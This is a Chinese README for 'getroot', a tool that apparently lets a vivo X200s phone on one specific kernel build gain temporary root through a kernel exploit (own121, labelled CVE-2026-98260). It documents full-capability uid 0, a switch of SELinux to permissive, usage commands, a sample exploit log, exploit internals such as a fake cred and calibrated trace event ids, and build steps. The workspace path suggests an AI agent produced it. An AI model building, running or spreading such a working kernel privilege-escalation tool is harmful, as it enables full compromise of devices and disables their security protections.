# getroot - CVE-2026-98260 临时 root（不加载 KernelSU）

给 vivo X200s（`6.6.127-android15-8-g3b723d0e8507-abogki558077879-4k`）用的
**临时 root 脚本**。不加载任何内核模块、不写任何分区、不改 BL；重启即失效。

## 0. 这个版本给你什么

| 项目 | 结果 |
|---|---|
| uid / euid | **0 / 0**（`setresuid(0,0,0)` 成功） |
| capabilities | **`0x1ffffffffff`**（FULLCAP，含 CAP_SYS_MODULE / CAP_SYS_ADMIN） |
| SELinux 域 | **`sid=1`（kernel 域）**，同时全局 `enforce=0`（permissive） |
| 通道 | 一条常驻的 root 命令通道（`cmd`），或一个交互式 root shell（`shell`） |
| 持久性 | 仅本次开机；`reboot` 全部消失 |
| KernelSU | **不加载**（没有 `kernelsu` 模块，没有 `su`） |

## 1. 本次改动（task-4）

1. **清晰的时间戳日志**：脚本每一步都打印 `[HH:MM:SS] [getroot] ...`，包括
   预检的每项 `[ OK ]/[WARN]/[FAIL]`、启动、每次轮询、探测、每条命令的 `rc`；
   不再有静默步骤。脚本自身步骤另存到 `$STATE/session.log`。
2. **实时回显**：`start` / `cmd` 在当前终端的**前台**跑一个 `tail -f` 跟随
   exploit 日志（按字节偏移从 EOF 开始），exploit / root shell 的输出**边产生
   边显示**，不是跑完再 dump；Windows 封装直接透传 `adb shell` 的输出，因此
   cmd/PowerShell 窗口里同样是实时的。
3. **智能等待**：默认每 **5 s** 轮询（`POLL=5`），总上限默认 **90 s**
   （`TMO=90`，可配 60~...）；命中
   `[rootsh] setresuid(0,0,0)=0`（root shell 就绪）或 gate/scan 标记立即停；
   命中失败标记、`.lock2` 被占、进程消失也立即停；用 **boot_id + /proc/uptime
   下降**检测设备重启，立即返回而不是傻等。
4. **预检（不满足就 abort）**：设备在线（Windows 端）、`sys.boot_completed=1`、
   uptime（<40 s 最佳，偏高给 `[WARN]`；老 boot 仍可跑但会提示）、
   `/sys/kernel/tracing` 存在、own121 可执行、`/data/local/tmp` 可写、
   **`.lock2` 未被别的实例占用**、没有其它 `own*` 进程、SELinux 状态、
   shell 工具齐全；任何 `[FAIL]` 都会打印
   `environment is NOT ready ... nothing was started` 并退出 1。
   同时把本次开机的 **boot_id** 写入 `$STATE/boot`：**一次开机只允许一次
   attempt**，二次 `start` 会被明确拒绝（`reboot` 后再来）。
5. **保持无 mkfifo 通道**：`$STATE/chan` 是普通文件，启动命令仍是
   `tail -f -n 0 <chan> | own121 rootsh`（该设备的 shell 域不能 mkfifo）。
6. **通道自检**：root shell 起来后先让它回显自己的 pid（`[gr] shpid=...`），
   用这个 pid 判断通道是否真的活着；`stop` 发 `exit` 并等 shell 退出
   （后面挂着的 `tail` 读端会尽力清理）。

## 2. 文件

```
work/vivo/own121.c          root shell 版 exploit 源码（fork 后再 setresuid）
work/vivo/own121            编译产物（aarch64 static）
work/vivo/getroot/
  getroot.sh                设备端脚本：check / start / cmd / cmdfile / shell / status / stop
  getroot.ps1               Windows 封装：push + 远程执行（实时输出）
  getroot.bat               Windows 一键脚本（双击即用：push + start + root 控制台）
  README.md                 本文件
  sample-transcript.txt     一次真实开机的完整 transcript（含实时日志）
  selftest/                 离线回归材料（fake adb + fake exploit，不跑真实利用）
```

## 3. 快速开始（Windows）

**最省事：双击 `getroot.bat`**（无参数）＝ push → start（含预检、实时日志）
→ 进入 `root>` 命令控制台：直接输入命令用 root 执行；`!shell` 交互式 root
shell；`!status` / `!check` / `!stop` / `exit`。

也可以在 cmd 里按子命令用：

```
getroot.bat check
getroot.bat start
getroot.bat cmd "id; getenforce"
getroot.bat shell
getroot.bat status
getroot.bat stop
getroot.bat menu
```

### 3.1 PowerShell 封装（等价）

```powershell
cd C:\Users\Camellia\Documents\deepseek-harness\default-workspace\work\vivo\getroot

.\getroot.ps1 check                  # 预检（设备 + 设备端）
.\getroot.ps1 start                  # 提权，起 root 命令通道（实时输出，默认 5s 轮询 / 90s 上限）
.\getroot.ps1 cmd "id; getenforce"   # 用 root 跑一条命令（输出实时，末尾有 rc）
.\getroot.ps1 shell                  # 交互式 root shell（Ctrl-D 退出）
.\getroot.ps1 status
.\getroot.ps1 stop
.\getroot.ps1 -Serial <serial> -Tmo 60 -Poll 5 start
```

参数：`-Serial` 选设备、`-Tmo` 总等待上限（10~300，默认 90）、
`-Poll` 轮询间隔（1~30，默认 5）。

批处理环境变量：`ADB=C:\path\adb.exe` 覆盖 adb、`ANDROID_SERIAL=xxx` 选设备、
`GR_TMO=90` 等待上限、`GR_POLL=5` 轮询间隔、`NO_PAUSE=1` 跳过关机暂停。

设备端（已 push 过之后）：

```sh
cd /data/local/tmp
sh getroot.sh check
sh getroot.sh start
sh getroot.sh cmd 'id; cat /proc/self/status | grep -E "Uid|CapEff"'
sh getroot.sh shell
sh getroot.sh status
sh getroot.sh stop
```

## 4. 环境变量（设备端 getroot.sh）

| 变量 | 默认 | 作用 |
|---|---|---|
| `EXPLOIT` | `/data/local/tmp/own121` | exploit 路径 |
| `TMO` | `90` | `start` 的总等待上限（秒）；`cmd` 的默认超时 |
| `POLL` | `5` | `start` 等待 root shell 时的轮询间隔（秒） |
| `TCPOLL` | `1` | 等待命令 rc 的轮询间隔（秒） |
| `FOLLOW` | `1` | `0` 关闭实时回显（只打印最终结果） |
| `MARK_OK` | `\[rootsh\] setresuid\(0,0,0\)=0` | 成功标记（grep -E） |
| `MARK_STOP` | gate/scan 结果 | 命中即停的 gate 标记（grep -E） |
| `FORCE` | `0` | `1` 允许同一开机的第二次 attempt（不建议） |

## 5. 一次典型运行（摘录）

完整版见 `sample-transcript.txt`。成功时大致是：

```
[12:34:56] [getroot] == pre-run environment check ==
[12:34:56] [getroot]   [ OK ] sys.boot_completed=1
[12:34:56] [getroot]   [ OK ] uptime 21s (fresh-boot window, good)
[12:34:56] [getroot]   [ OK ] exploit executable: /data/local/tmp/own121 (514648 bytes)
[12:34:56] [getroot]   [ OK ] /data/local/tmp/.lock2 is not held
[12:34:56] [getroot] environment ready (0 warning(s))
[12:34:56] [getroot] == launch exploit (one session per boot) ==
[12:34:56] [getroot]   pipeline: tail -f -n 0 '/data/local/tmp/.rootsh/chan' | '/data/local/tmp/own121' rootsh
[12:34:56] [getroot]   live echo: ON - exploit output follows below as it arrives
[+] pid=1234 cpu=0 mode=8
...
[12:35:02] [getroot] wait 4s/90s: root shell not up yet (last: [fake] slide VERIFIED ...)
[child] woke uid=0 euid=0 pid=1234 tgid=1234
[rootsh] setresuid(0,0,0)=0 errno=0 uid=0 euid=0 tty=0
[12:35:02] [getroot] marker after 6s: [rootsh] setresuid(0,0,0)=0 ...
[12:35:02] [getroot] root shell pid=1250 (from the channel pid echo)
[12:35:02] [getroot] == probe the root shell ==
[gr] begin c4321_1
uid=0(root) gid=0(root) ...
Uid:	0	0	0	0
CapEff:	000001ffffffffff
[gr] rc=0 c4321_1
[12:35:03] [getroot] rc=0
[12:35:03] [getroot]   [ OK ] probe confirms uid 0 0 0 0
[12:35:03] [getroot] == ready ==
```

## 6. 实现要点（为什么这样做）

* **实时回显用 `tail -c +N -f`，不用 `tail -f -n 0`**：这台设备是 toybox
  0.8.13，实测 `tail -f -n 0 FILE` 会先把**整个文件**打到 stdout 再跟随，
  会导致 `cmd` 把启动日志重放一遍；改成从当前文件长度 +1 的字节偏移开始
  跟随，就只输出新内容。
* **通道必须是无 mkfifo 的普通文件**：shell 域没有权限 mkfifo；`tail -f`
  读普通文件同样能持续读追加内容。启动用 `setsid sh -c "tail ... | own121
  rootsh"`，脚本退出后通道依然存活。
* **liveness 用 root shell 自己的 pid**：`tail` 读端在 shell 退出后不会自己
  退出（管道写端还挂着），所以不能拿 launch pid 当“shell 活着”。启动时让
  root shell 回显 `$$`（`[gr] shpid=...`），`stop` / `cmd` 用这个 pid 判断
  通道是否真活；`stop` 之后追加一个空行，尽力让读端因 SIGPIPE 退出。
  注意：**不能只用 `kill -0` 判活** —— exploit 成功后 root shell / parked
  父进程是 uid 0，而脚本是 uid 2000，`kill -0` 会 EPERM；必须用
  `ps -A -o PID,STAT` 查（`pid_alive()` 已改为 ps）。
* **flock 检测**：toybox 的 `flock` 只接受 fd（没有 `flock FILE cmd` 形式），
  所以预检用 `flock -n 9 9< /data/local/tmp/.lock2`：rc=0 表示没人占用。
* **一次开机一次 attempt**：`$STATE/boot` 存本次 `boot_id`；`start` 发现
  boot_id 相同且已有 attempt 就拒绝（除非 `FORCE=1`）；设备重启后 boot_id
  变化，自动放行并清理上一轮文件。
* **持久日志**：exploit 自己 fsync `/data/local/tmp/cve-2026-98260.log`
  （panic/重启后还能看）；`$STATE/rootd.log` 是通道输出副本（实时回显跟它）。

## 7. 限制与风险（重要）

* **一次开机只能起一次**。fake cred 的父进程必须一直 park（它占着被回收后
  又被 cred 引用的页），并且持有 `/data/local/tmp/.lock2`。所以：shell 退出后、
  或 `stop` 之后，想再来一次只能 `reboot`。
* **`stop` 不清理内核状态**，只关掉 shell。彻底恢复 = 重启。
* 设备当前会**自发重启**（`ro.boot.bootreason=kernel_panic`，boot 后数分钟）。
  建议开机 `boot_completed` 后 2~3 秒内执行 `start`，不要等。
* 本工具会把 SELinux 切成 permissive 并给 root 全 caps —— 任何能 adb 的人都
  能用；用完重启。不要把设备留在无人看管 + permissive 的状态。
* 失败时（`base calibration failed` / `cred leak failed` / 长时间停在
  `plant`）**不要**重复跑：先 `reboot`。重复跑最坏会走到未受控的 rb_erase。
* exploit 的 trace event id（269/272/273/275/277）是本 build 标定的；换固件
  要重标。

## 8. 排错

| 现象 | 处理 |
|---|---|
| `environment is NOT ready: N blocker(s)` | 看上面 `[FAIL]` 行；修好再来（多数情况是 `reboot`） |
| `a root attempt was already made on this boot` | 本次开机已经跑过；`reboot` |
| `another exploit instance holds .../.lock2` | 之前有 parked 实例；`reboot` |
| `device rebooted since 'start'` | 设备自己重启了；等 boot 完重新 `start` |
| `root shell did not answer the channel pid echo` | 通道没起来/已死；看实时日志，`reboot` 后重试 |
| `probe did not show 'Uid: 0 0 0 0'` | 拿到的不是真 root；`reboot` 后尽快重跑 |
| `timeout after 90s waiting for the root shell` | 日志停在 `[+] direct map base=` 之后 ⇒ 原语没命中，`reboot` 尽快重试 |
| `missing /data/local/tmp/own121` | `.\getroot.ps1 push`（或手动 push + `chmod 755`） |
| Windows `adb.exe not found` | 装 platform-tools 到 `C:\platform-tools` 或设 `ADB=` |
| Windows `no device in "adb devices"` | 插线、开 USB 调试、在手机上点允许 |
| `more than one device` 报错 | `.\\getroot.ps1 -Serial <serial> ...` |

## 9. 验证状态

* `getroot.sh`：
  * 设备 shell 域离线自测（`GR_DATA_DIR` 私有目录 + fake exploit
    `selftest/fake121`，**不跑真实 exploit**）：check / start / 实时回显 /
    2 s 轮询 / marker 提前停止 / 通道 pid 自检 / probe / status / cmd
    （远端 rc 透传）/ stop / 二次 start 拒绝，全部符合预期；完整记录在
    `selftest/device-fake-selftest.txt`；
  * Windows 侧 `selftest/run_offline_tests.ps1`：**46 项检查全部通过**，
    覆盖 PowerShell AST 解析、`getroot.sh` 的 dash 语法与无通道路径、
    `getroot.bat`/`getroot.ps1` 的 check/start/cmd（含 `&`、`|`、引号，
    命令文本原样落到 `.gr_cmd`）/shell/status/stop/无参数控制台，以及
    no-device、boot 未完成、start 失败、坏 `-Serial`、坏 `-Tmo` 等失败路径；
  * **真机（boot `a09b0a76`）**：`getroot.ps1 start` 在 uptime≈27 s 启动，
    exploit 输出实时回显，5 s 内命中 `[rootsh] setresuid(0,0,0)=0`，并拿到
    root shell 自己的 pid（`[gr] shpid=...`）。该次 `start` 在 probe 阶段
    暴露了一个**已修复**的 bug（旧 `kill -0` 判活对 uid 0 shell 返回 EPERM）；
    修复后对同一个仍存活的 root session 执行 `status` / `cmd` / `cmdfile`，
    得到真实 root：`uid=0`、`Uid: 0 0 0 0`、
    `CapEff: 000001ffffffffff`、`Seccomp: 0`、`selinux=Permissive`、`rc=0`
    （见 `selftest/live-uid0-probe.txt` 与 `sample-transcript.txt` §1）；
  * **仍待一次真机复测**：修复后的最终脚本在干净 boot 上完整跑
    `getroot.ps1 start` + `cmd` 的收尾验证没有完成——最后一次尝试被
    正确的预检拦下（设备上已有别的实验 `own127` 持有 `.lock2`，见
    `sample-transcript.txt` §3，预检按设计工作）。下次拿到设备时用一次
    干净 boot 跑通 start+cmd 即可，不需要改代码。
* `getroot.bat` / `getroot.ps1`：纯 ASCII + CRLF。
* 回归材料：`selftest/`（fake adb、fake exploit、设备自测驱动、tail 回归、
  flock helper、真机验证脚本）。

## 10. 重新编译 own121（可选）

```powershell
$d = C:\Users\Camellia\Documents\deepseek-harness\default-workspace\work\vivo
$ndk = C:\Users\Camellia\Documents\deepseek-harness\default-workspace\work\ndk\android-ndk-r27
$cc  = $ndk\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd
& $cc -std=gnu11 -O2 -g -static -pthread -D_GNU_SOURCE -Wall -Wextra `
    -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function "$d\own121.c" -o "$d\own121"
& $ndk\toolchains\llvm\prebuilt\windows-x86_64\bin\llvm-strip.exe --strip-all "$d\own121"
```
